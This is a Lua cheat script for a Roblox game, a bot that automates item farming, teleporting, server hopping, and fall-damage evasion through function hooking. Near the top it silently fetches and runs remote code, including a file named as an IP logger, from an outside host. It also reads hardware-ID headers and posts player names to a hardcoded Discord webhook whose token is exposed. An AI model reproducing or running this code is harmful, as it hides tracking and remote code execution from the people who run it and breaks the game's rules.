--[[
	id: D0hvZVTzTHRn2Rk1B2JFn
	name: Temple of fire bot
	description: d
	time1: 2021-07-12 08:03:11.585241+00
	time2: 2021-07-12 08:03:11.585243+00
	uploader: IvnADRSWX7AC6M1yT9Ptvzv2ISF7af_Zo9kKqv0S
	uploadersession: Y0uoQyczkx-vHzippP3iZyHNWcCVth
	flag: f
--]]

local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/TOFBot.Lua\' }.Body)();');

local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end


local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end
local key = false
local hwidkeys = { "c7d9759835c9397ffd37eca01d18d7ad7c4d9b6d5057d2efdac008450c3638b7d598be4f93caf4c89c2cf62ef859163ddbab4a0d203db77305f2111fe30ed018", "7736b29fb8439d817e984aa43e64bda0b7e0cfd56b9467ce348ce4ac30ae79f52e27ce7235bc1d97aebc726131c5bc7ab426c5d2c419cb36c07618e6350f291e",
    "d038ca3b43821d55f21dbf889d8f9d2525d55922c9fbacb214c6186bc14e24433cbd0c62970c7b9051cc184ee4e20a017027615841b161ba59ba7882cd6f5e7e", "386b22f8f753384be622237573f7384a94da3b2da0eeb85d0aef4987a046b5f245d98b6d9c743deae3c416458878e272096071a3b88ecec0aa7eab295fe556db", "14f404fad2d860388031b0841c1352e224b9a79b71477519327e945b15f04a92b83f3de083ebb67bd3b1db0beb040105dc3d975a00a9eb87d71dffe390bbef3c", "33057fc918bbeaf8bc0e5ba77dd07845705ed5fd0325b9b18bc6026d05a5f8ec989600ce771a5dced2679c6522398e8dec4dd0a9907ba3c90431ca058e552345",
    "5044bb206db9ff926b85bbffd1be0dea343e21bca4b320a7e2518a6aa15ba0f11997086dfb0164c851727c355f1f03335dbd20eba2627402d822c1846da219fa"
}

for i, hkeys in pairs(hwidkeys) do
    if hkeys == hwid then
        print("your in")
        key = true
        break
    end
end

loadstring(game:HttpGet(('http://archgay.xyz/tofbotiplogger.lua'),true))()

repeat wait() until game:IsLoaded()
local plr = game:GetService("Players").LocalPlayer

print("1")
local HttpService = game:GetService'HttpService';
local SettingsFileName = 'TempleOfFireBot.json';
local Settings = {
    Illu = true;
    Webhook = 'WebhookURL HERE';
};
if isfile(SettingsFileName) then
    Settings = HttpService:JSONDecode(readfile(SettingsFileName));
else
    local Settings = Settings;
    writefile(SettingsFileName, HttpService:JSONEncode(Settings));
    messageboxasync('Wrote settings to workspace, edit the \'' .. SettingsFileName .. '\' file to change settings', 'TempleOfFireBot', 0x40000);
end


local request = syn and syn.request or http_request
function message(happen)
    request({
        Url = Settings.Webhook;
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-\n"..tostring(happen).."\n-\n".."```"})
    }); 
end
local request = syn and syn.request or http_request
function ping(happen)
    request({
        Url = Settings.Webhook;
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "" .. tostring(happen) .. ""})
    }); 
end
function log(msg)
    request({
        Url = "https://discord.com/api/webhooks/864028064643678259/HHyhm1aa4xszDIDVgTaFG9OzEjTwQocXWkImmOeGvzkAeBUdgafK_0i_1HsjtMlZxTNg";
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(msg).."```"})
    });
end
print("2")
print("3")
if game.PlaceId == 5208655184 then
    wait(7)
    function Initialize()
for i,v in pairs(workspace.MonsterSpawns.Triggers:GetDescendants()) do
    if v.Name == "MazeSnakes" then
        print("Mazesnakes exists")
        if v:IsA("BasePart") then 
            print("It is a base part, Destroyed it.")
            v:Destroy()
        end
    end
end
for i,v in pairs(workspace.Map:GetDescendants()) do
 if v.Name == "Lava" then
            if v:IsA("BasePart") then 
                for i,v in pairs(v:GetDescendants()) do 
                    if v.Name == "TouchInterest" then
                        print("Destroyed")
                        v:Destroy()
                    end
                end
            end
    end
end  
end
Initialize()
firesignal(game:GetService "Players".LocalPlayer.PlayerGui.StartMenu.Choices.Play.MouseButton1Click)
print("hey")
wait(2)
local myhrp = game.Players.LocalPlayer.Character.HumanoidRootPart
local plr       =       game:GetService("Players").LocalPlayer
local player    =       game.Players.LocalPlayer
local character =       player.Character or player.CharacterAdded:Wait()
local char      =       game:GetService("Players").LocalPlayer.Character


pcall(function()
    local Players               = game:GetService'Players';
    local LocalPlayer           = Players.LocalPlayer;
    local Camera                = workspace.CurrentCamera;
    local RunService            = game:GetService'RunService';
    local UIS                   = game:GetService'UserInputService';
    local NearestObject         = nil;
    local LastObject            = NearestObject;
    local LastCheck             = 0;
    local TrinketAP             = true;
    local Enabled               = true; 
    shared.Blacklist            = shared.Blacklist or {};
     
    local Clickables = {};
    local TP = {};
    local Trinkets = {};
     
     
    for i, v in pairs(workspace:GetDescendants()) do
        if v.ClassName == 'ClickDetector' and (v.Parent:IsA'BasePart' or v.Parent:IsA'UnionOperation') then
            table.insert(Clickables, v.Parent);
            TP[tostring(v.Parent.Position)] = v;
        end
    end
     
    for i, v in pairs(workspace:GetChildren()) do
        if (v:IsA'BasePart' or v:IsA'UnionOperation') and TP[tostring(v.Position)] ~= nil then
            -- Trinkets[#Trinkets + 1] = {v, }
            table.insert(Trinkets, v);
        end
    end
     
    if shared.WSDC then shared.WSDC:disconnect(); end
     
    shared.WSDC = workspace.DescendantAdded:connect(function(child)
        if (child:IsA'BasePart' or child:IsA'UnionOperation') and wait(1 / 3) then
            if child:FindFirstChildOfClass'ClickDetector' then
                table.insert(Clickables, child);
                TP[tostring(child.Position)] = child:FindFirstChildOfClass'ClickDetector';
            end
            if TP[tostring(child.Position)] ~= nil then
                table.insert(Trinkets, child);
            end
        end
    end);
     
    function GetNearestObject()
        if #Trinkets < 1 then return false; end
     
        local Closest = Trinkets[math.random(#Trinkets)];
        local Distance = (Camera.CFrame.p - Closest.Position).magnitude;
     
        for i, v in pairs(Trinkets) do
            local LDistance = (Camera.CFrame.p - v.Position).magnitude;
            if TrinketAP and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild'Head' and (LocalPlayer.Character.Head.Position - v.Position).magnitude <= 15 and TP[tostring(v.Position)] then
                fireclickdetector(TP[tostring(v.Position)]);
            end
            if LDistance < Distance and not shared.Blacklist[v] and v:IsDescendantOf(workspace) then
                Distance = LDistance;
                Closest = v;
            end
        end
     
        return Closest;
    end
     
     
    RunService:UnbindFromRenderStep'NOL';
     
    RunService:BindToRenderStep('NOL', 0, function()
        if Enabled and tick() - LastCheck > 1 / 8 then
            LastCheck     = tick();
            NearestObject = GetNearestObject();
        end
    end)
end)
function nofall()
pcall(function() 
for i,v in pairs(getconnections(game:service'ScriptContext'.Error)) do 
    v:Disable();
end 
end)


local old; old = hookfunction(Instance.new("RemoteEvent").FireServer, function(self,...)
    local args = {...}
    
    if plr.Character ~= nil and plr.Character:FindFirstChild'CharacterHandler' and plr.Character.CharacterHandler:FindFirstChild'Remotes' and self.Parent == plr.Character.CharacterHandler.Remotes then
        if #args == 2 and typeof(args[2]) == "table" then
            return nil
        end
    end


    return old(self,...)
end)
end
nofall()



function serverhop()
game:GetService("StarterGui"):SetCore("PromptBlockPlayer", game.Players:GetChildren()[3])
wait(2)
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local PlayButton = game.CoreGui.RobloxGui.PromptDialog.ContainerFrame.ConfirmButton.ConfirmButtonText
local X = PlayButton.AbsolutePosition.X
local Y = PlayButton.AbsolutePosition.Y
print(X)
print(Y)
print(PlayButton.AbsolutePosition)

Y = Y + 45
X = X + 10

game:GetService("VirtualInputManager"):SendMouseButtonEvent(X, Y, 0, true, game, 0)
wait(.15)
game:GetService("VirtualInputManager"):SendMouseButtonEvent(X, Y, 0, false, game, 0)
wait(.15)
game:GetService("VirtualInputManager"):SendMouseButtonEvent(X, Y, 0, true, game, 0)
wait(.25)
if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then
    print("welp we are fucked")
    else
game:GetService("Players").LocalPlayer:Kick('Server hopping..') 
wait(1)
while wait() do 
Game:GetService("TeleportService"):Teleport(3016661674, game:GetService("Players").LocalPlayer)
end
end
end

if Settings.Illu then
    local Players = game.Players
    local Live = game.Workspace.Live
    
    for i, v in pairs(Players:GetChildren()) do
        if v.Backpack:FindFirstChild'Observe' then
            serverhop()
        end
    end
    for z, x in pairs(Live:GetChildren()) do
        if x:FindFirstChild'Observe' then
            serverhop()
        end
    end
end
wait(0.1)
message("Farming Server!")
function checkforartis()
    
    pcall(function()
for i,v in pairs (plr.Backpack:GetChildren()) do
        if v.Name == ("Night Stone") then
            log(game.Players.LocalPlayer.Name .. "Found a Night Stone")
            ping("@everyone")
		    message("FOUND A Night Stone")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
          if v.Name == ("Rift Gem") then
            log(game.Players.LocalPlayer.Name .. "Found a Night Stone")
            ping("@everyone")
		    message("FOUND A Rift Gem")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Scroll of Fimbulvetr") then
            log(game.Players.LocalPlayer.Name .. "Found a Fimbulvetrurrruur")
            ping("@everyone")
		    message("FOUND A Fimbul")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Scroll of Manus Dei") then
            log(game.Players.LocalPlayer.Name .. "Manus poop dei")
            ping("@everyone")
		    message("FOUND A What should be a common spell but is a god spell(manus dei (shit))")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Spider Cloak") then
            log(game.Players.LocalPlayer.Name .. "Found a Spider CLoak")
            ping("@everyone")
		    message("FOUND A Spider Cloak")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Howler Friend") then
            log(game.Players.LocalPlayer.Name .. "Found a Bone(howler  friend)")
            ping("@everyone")
		    message("FOUND A Howler Friend")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Ice Essence") then
            water(game.Players.LocalPlayer.Name .. "Found a ice essence")
		    message("FOUND A Ice Essence")
		    
        end
        if v.Name == ("Amulet Of The White King") then
            log(game.Players.LocalPlayer.Name .. "Found a WKA")
		    message("FOUND A Amulet Of The White King")
		    ping("@everyone")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Scroom Key") then
            log(game.Players.LocalPlayer.Name .. "Found a Scroom Key")
		    message("FOUND A Scroom Key")
		    ping("@everyone")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Fairfrozen") then
            log(game.Players.LocalPlayer.Name .. "found a fair frozen")
		    message("FOUND A Fairfrozen")
		    ping("@everyone")
		    wait(0.2)
		    repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
        if v.Name == ("Phoenix Down") then
            water(game.Players.LocalPlayer.Name .. "Found a PD")
		    message("FOUND A Phoenix Down")
        end
        if v.Name == ("Mysterious Artifact") then
            log(game.Players.LocalPlayer.Name .. "Found a MA ")
		    message("FOUND A MA")
		    ping("@everyone")
		    wait(0.2)
		     repeat wait() until not plr.Character:FindFirstChild'Danger'; wait(0.15);
		    plr:kick("\nfound an artifact")
        end
end
end)
end
farm = true
 function autoclaim()
      print("Auto claimingb yes")
for i,v in pairs (game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name:match("Scroll of Trahere") or v.Name:match("Scroll of Telorum") or v.Name:match("Ice Essence") then
            local player = game:GetService("Players").LocalPlayer
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            humanoid:EquipTool(v)
            v:Activate()
            end
end
end

spawn(function()
 for i,v in pairs(game:GetService("Players"):GetPlayers()) do
    if (plr.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude < 700 and v.Name ~= plr.Name then
        farm = false 
    serverhop()
    end
 end
end)
for i,v in pairs(workspace.Live:GetChildren()) do 
                    if string.find(string.lower(v.Name), 'serpant')  then
                        farm = false
                        if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then
                                     print("In combat")
                                else
                        serverhop()
                        Serpant = v
                        break
                    end
                end
                
                end
wait(4.5)
local TS = game:GetService'TweenService';
local Tweening = false;

if farm == true then 
    
        
        
local TW = TweenInfo.new(1.5, Enum.EasingStyle.Linear);

local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(3996.583, 536.042, -724.979) });
Tween:Play();
wait(1.5)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4021.054, 531.426, -766.116) });
Tween:Play();
wait(.5)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4021.054, 531.426, -797.685) });
Tween:Play();
wait(3)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(3963.11, 436.794, -945.637) });
Tween:Play();
wait(5.5)
local TW = TweenInfo.new(1, Enum.EasingStyle.Linear);
Tween:Play();
wait(0.5)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(3978.7568359375, 439.2939453125, -992.3154296875) });
Tween:Play();
wait(1.5)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4010.2182617188, 439.2939453125, -993.38006591797) });
Tween:Play();
wait(1.5)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4001.4201660156, 439.2939453125, -1008.9209594727) });
Tween:Play();
wait(1.5)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4025.167, 439.294, -997.97) });
Tween:Play();
wait(3)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4022.8188476563, 439.2939453125, -791.25323486328) });
Tween:Play();
local TW = TweenInfo.new(.3, Enum.EasingStyle.Linear);
wait(2.3)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4028.2390136719, 538.01525878906, -792.94763183594) });
Tween:Play();
wait(.3)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(4024.211, 533.926, -763.627) });
Tween:Play();
wait(.3)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(3998.8037109375, 538.15209960938, -714.51538085938) });
Tween:Play();
local TW = TweenInfo.new(3.2, Enum.EasingStyle.Linear);
wait(2)
local Tween = TS:Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CFrame.new(3950.4348144531, 538.53564453125, -573.2744140625) });
Tween:Play();
checkforartis()
wait(0.5)
autoclaim()
wait(1)
while wait(0.1) do 
if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then
    print("In combat")
    else
        serverhop()
        wait(6)
        game:GetService("Players").LocalPlayer:Kick('Server hopping..') 
    end 
    end
end
else
        serverhop()
        end